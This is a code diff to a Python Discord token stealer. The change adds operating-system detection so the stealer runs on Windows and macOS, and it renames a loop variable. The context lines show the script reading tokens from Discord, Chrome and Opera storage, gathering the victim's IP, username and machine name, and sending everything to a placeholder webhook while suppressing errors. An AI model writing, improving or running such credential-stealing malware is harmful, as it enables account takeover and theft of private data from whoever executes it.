@@ -1,4 +1,5 @@
 import os
+from sys import platform
 from platform import node
 from getpass import getuser
 from re import findall
@@ -10,11 +11,20 @@ ssl._create_default_https_context = ssl._create_unverified_context
 
 WEBHOOK = "ADD_WEBHOOK" #Change me!!!
 
-if os.name == "nt":
+if platform == "linux" or platform == "linux2":
+    OS = "Linux"
+elif platform == "darwin":
+    OS = "OSX"
+elif platform == "win32":
+    OS = "Windows"
+else:
+    OS = "Undefined"
+
+if OS == "Windows":
     LOCAL = os.getenv("LOCALAPPDATA")
     ROAMING = os.getenv("APPDATA")
 
-if os.name == "posix":
+if OS == "OSX":
     ROAMING = os.path.expanduser("~/Library/Application Support")
 
 PATHS = {
@@ -23,7 +33,7 @@ PATHS = {
     "Discord PTB": os.path.join(ROAMING, "discordptb"),
     }
 
-if os.name == "nt":
+if OS == "Windows":
     PATHS.update({
         "Google Chrome": os.path.join(LOCAL, "Google", "Chrome", "User Data", "Default"),
         "Opera": os.path.join(ROAMING, "Opera Software", "Opera Stable"),
@@ -44,6 +54,7 @@ def gettokens(path):
                 for token in findall(regex, line):
                     tokens.append(token)
     return tokens
+
 
 def getheaders(token=None, content_type="application/json"):
     headers = {
@@ -95,9 +106,9 @@ def main(WEBHOOK_URL):
     ip = getip()
     pc_username = getuser()
     pc_name = node()
-    if os.name == 'posix':
+    if OS == 'OSX':
         pc_name = pc_name.split(".")[0] if pc_name.find('.') else pc_name
-    for platform, path in PATHS.items():
+    for app_name, path in PATHS.items():
         if not os.path.exists(path):
             continue
         for token in gettokens(path):
@@ -136,7 +147,7 @@ def main(WEBHOOK_URL):
                     },
                     {
                         "name": "**PC Info**",
-                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
+                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken App: {app_name}',
                         "inline": True
                     },
                     {
@@ -161,7 +172,7 @@ def main(WEBHOOK_URL):
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-         urlopen(Request(WEBHOOK_URL, data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request(WEBHOOK_URL, data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
 
